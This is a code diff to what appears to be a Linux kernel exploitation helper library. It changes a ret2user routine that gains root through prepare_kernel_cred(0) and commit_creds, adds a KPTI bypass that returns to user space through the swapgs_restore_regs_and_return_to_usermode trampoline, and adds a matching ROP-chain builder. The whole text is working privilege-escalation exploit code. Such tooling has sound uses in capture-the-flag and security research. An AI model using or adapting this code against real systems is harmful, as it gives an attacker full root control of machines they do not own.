@@ -8,7 +8,9 @@
 #define ENABLE_MSG_MSG
 #define ENABLE_SETXATTR
 #define ENABLE_ROP
+#ifdef __GLIBC__
 #define ENABLE_USERFAULTFD
+#endif
 #define ENABLE_COMM
 #define ENABLE_DUMP
 
@@ -262,28 +264,54 @@ void save_state() {
 
 unsigned long prepare_kernel_cred;
 unsigned long commit_creds;
+unsigned long swapgs_restore_regs_and_return_to_usermode_0x16;
 
 void ret2user() {
-  asm(".intel_syntax noprefix;"
-      "mov rax, prepare_kernel_cred;"
-      "xor rdi, rdi;"
-      "call rax;"
-      "mov rdi, rax;"
-      "mov rax, commit_creds;"
-      "call rax;"
-      "swapgs;"
-      "mov r15, user_ss;"
-      "push r15;"
-      "mov r15, user_sp;"
-      "push r15;"
-      "mov r15, user_rflags;"
-      "push r15;"
-      "mov r15, user_cs;"
-      "push r15;"
-      "mov r15, user_ip;"
-      "push r15;"
-      "iretq;"
-      ".att_syntax;");
+  if (swapgs_restore_regs_and_return_to_usermode_0x16) {
+    asm(".intel_syntax noprefix;"
+        "mov rax, prepare_kernel_cred;"
+        "xor rdi, rdi;"
+        "call rax;"
+        "mov rdi, rax;"
+        "mov rax, commit_creds;"
+        "call rax;"
+        "mov r15, user_ss;"
+        "push r15;"
+        "mov r15, user_sp;"
+        "push r15;"
+        "mov r15, user_rflags;"
+        "push r15;"
+        "mov r15, user_cs;"
+        "push r15;"
+        "mov r15, user_ip;"
+        "push r15;"
+        "mov r15, 0;"
+        "push r15;"
+        "mov rax, swapgs_restore_regs_and_return_to_usermode_0x16;"
+        "call rax;"
+        ".att_syntax;");
+  } else {
+    asm(".intel_syntax noprefix;"
+        "mov rax, prepare_kernel_cred;"
+        "xor rdi, rdi;"
+        "call rax;"
+        "mov rdi, rax;"
+        "mov rax, commit_creds;"
+        "call rax;"
+        "swapgs;"
+        "mov r15, user_ss;"
+        "push r15;"
+        "mov r15, user_sp;"
+        "push r15;"
+        "mov r15, user_rflags;"
+        "push r15;"
+        "mov r15, user_cs;"
+        "push r15;"
+        "mov r15, user_ip;"
+        "push r15;"
+        "iretq;"
+        ".att_syntax;");
+  }
 }
 
 void rop_iretq(unsigned long *p) {
@@ -292,6 +320,13 @@ void rop_iretq(unsigned long *p) {
   *p++ = user_rflags;
   *p++ = user_sp;
   *p++ = user_ss;
+}
+
+void rop_swapgs_restore_regs_and_return_to_usermode(unsigned long *p) {
+  *p++ = swapgs_restore_regs_and_return_to_usermode_0x16;
+  *p++ = -1;
+  *p++ = -1;
+  rop_iretq(p);
 }
 #endif
 
